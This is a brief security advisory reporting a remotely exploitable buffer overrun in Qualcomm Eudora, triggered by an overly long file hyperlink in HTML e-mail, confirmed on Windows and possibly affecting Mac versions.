Qualcomm Eudora is reported to be prone to a remotely exploitable buffer overrun vulnerability.

The issue is exposed when an excessively long hyperlink to a file resource is embedded in an HTML e-mail. This may permit remote attackers to execute arbitrary code via malicious e-mail in the context of the client user.

This issue was reported in Eudora on Windows platforms. Eudora for Apple Mac operating systems may be similarly affected, though this has not been confirmed.
